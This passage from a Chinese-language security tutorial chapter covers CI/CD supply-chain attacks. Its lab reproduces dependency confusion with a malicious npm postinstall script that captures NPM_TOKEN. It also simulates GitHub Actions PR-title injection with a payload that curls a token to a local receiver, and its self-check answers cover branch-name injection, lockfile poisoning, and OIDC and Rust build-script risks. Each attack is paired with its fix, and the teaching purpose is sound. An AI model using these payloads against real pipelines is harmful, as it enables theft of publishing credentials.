          cosign sign --yes "registry.nexuspay.internal/core-gateway@${IMAGE_DIGEST}"
```

---

## 動手做

- **難度**：進階
- **預估時間**：45 分鐘

這個實驗完全在你的本機上跑，不用連外網也不用花半毛雲端費用（請先確認本機有 `python3` 3.10+、`node` 與 `npm`）。

我們會建一個乾淨的暫存目錄 `/tmp/ch19-lab` 做兩場實驗：第一場模擬內部套件沒綁 Scope 時，怎麼被高版本號的 `99.0.0` 惡意套件搶走並觸發 `postinstall` 偷走 `NPM_TOKEN`；第二場則用 Python 模擬 GitHub Actions 的模板預展開機制，實際送出那段 45 字元的 PR 標題，親眼看看 `NPM_TOKEN` 是怎麼被 `curl` 打出來的，以及改成 `env:` 之後怎麼當場擋下。

### 步驟 1：重現 Dependency Confusion 與 `postinstall` 偷權杖

先建好實驗目錄，然後在本地打包兩個同名為 `nexuspay-ledger-core` 的 tarball：一個是公司內部的合法版本 `1.4.2`，另一個是攻擊者在公有庫搶註的高版本 `99.0.0`（裡面藏了一行會在安裝完立刻偷走 `$NPM_TOKEN` 的 `postinstall` 腳本）：

```bash
mkdir -p /tmp/ch19-lab/{registry-sim,app-demo,ci-sim,private-pkg,malicious-pkg,scoped-pkg}

# 1. 打包內部合法套件 (版本 1.4.2)
cat <<'EOF' > /tmp/ch19-lab/private-pkg/package.json
{
  "name": "nexuspay-ledger-core",
  "version": "1.4.2"
}
EOF
(cd /tmp/ch19-lab/private-pkg && npm pack --pack-destination /tmp/ch19-lab/registry-sim)

# 2. 打包公有庫搶註的高版本惡意套件 (版本 99.0.0，含 postinstall 竊取腳本)
cat <<'EOF' > /tmp/ch19-lab/malicious-pkg/package.json
{
  "name": "nexuspay-ledger-core",
  "version": "99.0.0",
  "scripts": {
    "postinstall": "echo '[ATTACK] postinstall executed! NPM_TOKEN='\"$NPM_TOKEN\" > /tmp/ch19-lab/pwned.txt"
  }
}
EOF
(cd /tmp/ch19-lab/malicious-pkg && npm pack --pack-destination /tmp/ch19-lab/registry-sim)

# 3. 模擬未綁定 Scope 的聚合代理（同時看到 1.4.2 與 99.0.0 時，按 SemVer 挑最高版 99.0.0 安裝）
cd /tmp/ch19-lab/app-demo
npm init -y >/dev/null 2>&1
SELECTED_TGZ=$(python3 -c '
candidates = [("1.4.2", "nexuspay-ledger-core-1.4.2.tgz"), ("99.0.0", "nexuspay-ledger-core-99.0.0.tgz")]
best = max(candidates, key=lambda x: tuple(map(int, x[0].split("."))))
print("/tmp/ch19-lab/registry-sim/" + best[1])
')
echo "Unscoped 聚合解析選中: $SELECTED_TGZ"
NPM_TOKEN="npm_demo_secret_token_36_chars_123456" npm install "$SELECTED_TGZ"

# 4. 檢查 /tmp/ch19-lab/pwned.txt 是否已被寫入偷來的 NPM_TOKEN
cat /tmp/ch19-lab/pwned.txt
```

看到 `pwned.txt` 被印出來之後，試著把套件改名為帶 Scope 的 `@nexuspay/ledger-core`，並在 `.npmrc` 鎖上 `@nexuspay:registry` 與 `ignore-scripts=true`，驗證看看 `postinstall` 是不是就被徹底擋掉了。

### 步驟 2：重現並修補 GitHub Actions 標題注入（Script Injection）

接著我們寫一支 `/tmp/ch19-lab/ci-sim/runner_sim.py`。這支程式會在背景開一個本機 `127.0.0.1:18080` 的 HTTP 接收站（扮演攻擊者的伺服器），然後分別跑一次「直接把 `${{ PR_TITLE }}` 展開進 `echo` 的漏洞版 workflow」跟「改用 `env:` 傳遞 `PR_TITLE` 的修補版 workflow」：

```python
# /tmp/ch19-lab/ci-sim/runner_sim.py
import http.server
import os
import subprocess
import threading

RECEIVED = []

class SinkHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", errors="replace")
        RECEIVED.append(body)
        self.send_response(200)
        self.end_headers()

    def log_message(self, format, *args):
        pass  # 靜音 HTTP 存取日誌

def run_vulnerable(pr_title: str, token: str):
    # 模擬 GitHub Actions 先將 ${{ github.event.pull_request.title }} 純文字展開
    expanded_script = f'echo "PR: {pr_title}"'
    env = os.environ.copy()
    env["NPM_TOKEN"] = token
    subprocess.run(["bash", "-e", "-c", expanded_script], env=env, check=False)

def run_patched(pr_title: str, token: str):
    # 修補後：透過環境變數傳遞，Shell 程式碼本身不含任何模板插值
    fixed_script = 'printf "PR: %s\\n" "$PR_TITLE"'
    env = os.environ.copy()
    env["NPM_TOKEN"] = token
    env["PR_TITLE"] = pr_title
    subprocess.run(["bash", "-e", "-c", fixed_script], env=env, check=False)

if __name__ == "__main__":
    server = http.server.HTTPServer(("127.0.0.1", 18080), SinkHandler)
    t = threading.Thread(target=server.serve_forever, daemon=True)
    t.start()

    secret = "npm_1234567890abcdefghijklmnopqrstuvwxyz"
    # 本地驗證用注入標題（把 Worked Example 的 https://x.io/c 換成本地接收站）
    payload = 'x"; curl -s -d "$NPM_TOKEN" http://127.0.0.1:18080/c; #'

    print("--- 1. 測試漏洞 Workflow ---")
    run_vulnerable(payload, secret)
    print(f"外洩接收數量: {len(RECEIVED)}, 內容: {RECEIVED}")

    RECEIVED.clear()
    print("--- 2. 測試修補後 Workflow ---")
    run_patched(payload, secret)
    print(f"外洩接收數量: {len(RECEIVED)}")

    server.shutdown()
```

把上面那段存成 `/tmp/ch19-lab/ci-sim/runner_sim.py`，直接執行 `python3 /tmp/ch19-lab/ci-sim/runner_sim.py` 看看兩邊的差距。做完實驗記得執行 `rm -rf /tmp/ch19-lab` 把暫存檔清掉。

### 外部靶場對照檢查點

想練習更多真實的 CI/CD 管線攻防，推薦去玩玩看下面兩個免費開源資源：

1. **CICD-Goat**（https://github.com/cider-security-research/cicd-goat ）：可以直接在本機用 Docker Compose 跑起來的 CI/CD 專屬靶場，裡面包含了完整的 Git 伺服器、Jenkins / GitHub Actions 風格管線與套件庫，能讓你親手打穿 Dependency Confusion、Lockfile 投毒與 Pipeline 命令注入等十幾個關卡。
2. **Actionlint 與 Zizmor 靜態掃描實測**：試著在你的電腦裝上開源的 GitHub Actions 語法與資安掃描器 `zizmor`（或 `actionlint`），拿它去掃描你們團隊現有的 `.github/workflows/*.yml`，看看能不能當場抓出還沒修掉的 `${{ ... }}` 注入點或沒鎖 Commit SHA 的第三方 Action。

---

### 參考解答

#### 1. 任務一：Scoped Package 與 `--ignore-scripts` 雙重封堵結果

在步驟 1 跑完無防護的 `npm install "$SELECTED_TGZ"` 後，因為解析器挑了版本號高達 `99.0.0` 的惡意套件，而且安裝過程直接執行了 `postinstall`，執行 `cat /tmp/ch19-lab/pwned.txt` 會馬上看到被偷出來的權杖：
`[ATTACK] postinstall executed! NPM_TOKEN=npm_demo_secret_token_36_chars_123456`

接著我們用下面這段指令把內部套件改名為 `@nexuspay/ledger-core`（版本 `1.4.2`），並在 `.npmrc` 裡鎖死 `@nexuspay:registry` 與 `ignore-scripts=true`：

```bash
rm -f /tmp/ch19-lab/pwned.txt
rm -rf /tmp/ch19-lab/app-demo/node_modules /tmp/ch19-lab/app-demo/package-lock.json

cat <<'EOF' > /tmp/ch19-lab/scoped-pkg/package.json
{
  "name": "@nexuspay/ledger-core",
  "version": "1.4.2",
  "scripts": {
    "postinstall": "echo 'should not run when ignore-scripts is enabled' > /tmp/ch19-lab/pwned.txt"
  }
}
EOF
(cd /tmp/ch19-lab/scoped-pkg && npm pack --pack-destination /tmp/ch19-lab/registry-sim)

cat <<'EOF' > /tmp/ch19-lab/app-demo/.npmrc
@nexuspay:registry=http://127.0.0.1:4873/
ignore-scripts=true
EOF

# 重新安裝並加上 --ignore-scripts，驗證 pwned.txt 完全不會被產生
NPM_TOKEN="npm_demo_secret_token_36_chars_123456" npm install --ignore-scripts /tmp/ch19-lab/registry-sim/nexuspay-ledger-core-1.4.2.tgz /tmp/ch19-lab/registry-sim/nexuspay-ledger-core-99.0.0.tgz
test ! -f /tmp/ch19-lab/pwned.txt && echo "[DEFENSE] Scoped resolution & --ignore-scripts blocked postinstall successfully"
```

這時不但 `@nexuspay/*` 的查詢再也不會外流到公有庫去跟 `99.0.0` 比大小，而且因為加上了 `--ignore-scripts`，就算哪個第三方套件裡面真的藏了 `postinstall`，在安裝階段也會被完全跳過，`pwned.txt` 根本不會出現。

#### 2. 任務二：Workflow 標題注入與 `env:` 修補輸出比對

執行 `python3 /tmp/ch19-lab/ci-sim/runner_sim.py` 後，終端機會印出非常清楚的對比：

```text
--- 1. 測試漏洞 Workflow ---
PR: x
外洩接收數量: 1, 內容: ['npm_1234567890abcdefghijklmnopqrstuvwxyz']
--- 2. 測試修補後 Workflow ---
PR: x"; curl -s -d "$NPM_TOKEN" http://127.0.0.1:18080/c; #
外洩接收數量: 0
```

在第一段漏洞模式裡，螢幕上只乖乖印出了 `PR: x`，後面的 `curl` 已經偷偷在背景把 40 字元的 `npm_1234567890abcdefghijklmnopqrstuvwxyz` 打進了 `18080` 接收站；而在第二段改用 `env:` 傳遞的修補模式裡，整串帶有分號跟 `curl` 的惡意標題被當成純文字完完整整印在螢幕上，接收站收到的外洩請求數是 `0`。

---

## 自我檢核

- **難度**：進階
- **預估時間**：20 分鐘

先別往回翻，試著用剛拆解過的建置管線與解析規則，回答下面 4 個真實資安審查問題：

1. **有驗 SHA-512 為什麼還是中招**：既然 `npm ci` 在安裝時，會嚴格核對下載回來的套件跟 `package-lock.json` 裡記錄的 `integrity`（SHA-512 雜湊值）必須一模一樣，為什麼我們還是說「光靠 `npm ci` 擋不住外部 PR 的 Lockfile 投毒」？要多加什麼檢查才攔得住？
2. **沒跑 `checkout` 也掉權杖**：在一個使用 `pull_request_target` 觸發的 GitHub Actions workflow 裡，開發者很小心，完全沒有呼叫 `actions/checkout` 去拉外部 PR 的程式碼，就只是在 `run:` 裡面寫了一行 `echo "Branch: ${{ github.event.pull_request.head.ref }}"`。請問攻擊者要怎麼利用這一行偷走環境裡的 `NPM_TOKEN`？為什麼把變數搬進 `env:` 就能根治這個問題？
3. **一顆星號毀掉整條 OIDC 防線**：某團隊把部署流程改成了最時髦的 AWS OIDC 無金鑰驗證，但在寫 AWS IAM Role 的 Trust Policy 時，把條件寫成了 `"token.actions.githubusercontent.com:sub": "repo:nexuspay/core:*"`。請問這顆星號打開了什麼致命破口？應該怎麼改才安全？
4. **只跑 `cargo check` 也算執行程式碼嗎**：某位資深工程師在審查外部送來的 Rust PR 時說：「我又沒有跑 `cargo run` 或 `cargo test`，我只在本機跟 CI 跑一下 `cargo check` 檢查型別有沒有過而已，絕對不會執行到對方的惡意程式碼啦！」請從 Rust 編譯器的運作機制，說明為什麼他這個想法大錯特錯？這跟 Node.js 用 `--ignore-scripts` 防禦有什麼本質上的不同？

---

### 參考解答

1. **有驗 SHA-512 為什麼還是中招**：
   - 因為 `integrity` 欄位驗的是「**抓下來的檔案，跟 `package-lock.json` 裡寫的雜湊一不一樣**」，它根本不驗「**那個檔案是不是從正牌官方 Registry 下載的**」。
   - 攻擊者只要在發 PR 時，趁著幾千行的 Lockfile 變更沒人仔細看，把某個深層套件的 `resolved` 網址改成自己架的惡意伺服器，再把自己那包惡意 tarball 的真實 SHA-512 算出來填進 `integrity` 欄位裡，`npm ci` 下載完一核對雜湊發現完全吻合，就會開心地把惡意套件裝進去。要攔住這招，必須在 CI 加上自動化的 Lockfile diff 檢查（強制核對所有 `resolved` 網址都必須屬於官方或公司內部白名單 Registry 網域），並搭配內部 Registry Proxy。
2. **沒跑 `checkout` 也掉權杖**：
   - `github.event.pull_request.head.ref` 是攻擊者在自己 Fork 倉庫裡取的來源分支名稱，完全由攻擊者控制。因為 GitHub Actions 會在啟動 `bash` 之前，先把 `${{ ... }}` 當成純文字直接替換進 `run:` 腳本裡；攻擊者只要把自己的分支名稱取成 `fix/";curl ...#` 或塞進 `$(curl ...)`，展開後就會直接跳出 `echo` 的雙引號，讓 `bash` 當場執行他塞進來的 `curl` 指令把 `NPM_TOKEN` 外傳。
   - 改放到步驟層級的 `env:`（例如 `BRANCH_NAME: ${{ github.event.pull_request.head.ref }}`）之後，Runner 是直接把那串字寫進作業系統行程的環境變數記憶體區段，而交給 `bash` 跑的腳本則是固定不變的 `printf 'Branch: %s\n' "$BRANCH_NAME"`。因為 `bash` 在展開雙引號裡的 `"$BRANCH_NAME"` 時，只會把它當成純字串值，不會再做第二次語法切詞或命令替換，自然就再也不可能變出額外的 Shell 指令了。
3. **一顆星號毀掉整條 OIDC 防線**：
   - 寫成 `"repo:nexuspay/core:*"` 等於把主體比對放寬到了整個倉庫。只要是在 `nexuspay/core` 底下，**任何一個測試分支、任何一個 Tag、甚至外部 Pull Request** 觸發的 workflow，只要那個 workflow 被給了 `id-token: write` 權限（且 `aud` 符合），它向 GitHub 領出來的 OIDC JWT 就通通能通過這條 `sub` 檢查，直接跟 AWS 換到生產環境的 IAM Role 憑證。
   - 正確做法是在 AWS Trust Policy 裡，除了驗證 `aud`，還要把 `sub` 用 `StringEquals` 精確鎖死在受保護的正式環境或主分支上（例如只准 `"repo:nexuspay/core:environment:production"` 或 `"repo:nexuspay/core:ref:refs/heads/main"`；如果想連「只能由哪個發布專用 workflow 檔案換憑證」都鎖死，還可以透過 GitHub OIDC 自訂 `sub` 範本把 `job_workflow_ref` 塞進 `sub` 裡讓 IAM 一起核對）。
4. **只跑 `cargo check` 也算執行程式碼嗎**：
   - **完全算，而且已經執行完了！** 在 Rust 裡，只要是第一次編譯或沒命中快取，任何進入當前檢查目標的 crate 如果帶有 **`build.rs`**（建置腳本），或是有用到 **`proc_macro`**（程序巨集，像 `#[derive(...)]` 衍生巨集、屬性巨集等），`cargo check`（甚至是用 VS Code 打開專案時背景自動跑的 `rust-analyzer`）為了完成前置建置與巨集展開好做型別檢查，**在編譯期就會先把 `build.rs` 編譯成執行檔跑起來，並把 `proc_macro` 編譯成動態函式庫載入 `rustc` 執行**。根本不用等到產出最後的 binary 或跑 `cargo run`，你的機器就已經被執行完任意程式碼了。
   - 這跟 Node.js 最大的差異在於：Node.js 的大多數純 JS 套件就算用 `--ignore-scripts` 把 `postinstall` 關掉，程式還是能正常跑；但在 Rust 裡，如果你把 `build.rs` 或 `proc_macro` 硬關掉，幾乎所有用到 `serde`、`tokio` 等巨集的程式碼連編譯跟型別檢查都會直接失敗。所以審計未知的 Rust 專案或依賴時，一定要先丟進無憑證、無外網的隔離容器／沙箱裡跑，並搭配 `cargo build --locked` 與 `cargo-vet` 來把關 `build.rs` 跟巨集的安全性。

---

## 延伸閱讀

- **OWASP Top 10:2025 — A03: Software Supply Chain Failures**（https://owasp.org/Top10/ ）：了解為什麼軟體供應鏈與建置管線失效會在 2025 版被獨立拉出來列為第三大風險，以及官方給出的防禦檢核表。
- **GitHub Docs — Security hardening for GitHub Actions & OpenID Connect**（https://docs.github.com/en/actions/security-for-github-actions ）：GitHub 官方針對 `pull_request_target`、Script Injection 防禦、第三方 Action 40 字元 SHA 鎖定與 OIDC Claim 驗證的完整實戰指南。
- **SLSA Specification v1.0**（https://slsa.dev/spec/v1.0/ ）：深入理解 Build L1 到 L3 的建置來源證明（Provenance）要求，以及為什麼簽章控制平面必須跟建置執行環境隔離。
- **Sigstore / Cosign 官方文件**（https://docs.sigstore.dev/ ）：搞懂怎麼把 OIDC 短效身分、Fulcio 10 分鐘憑證與 Rekor 透明日誌串起來，幫容器映像檔與 SBOM 蓋上不用管私鑰的數位簽章。
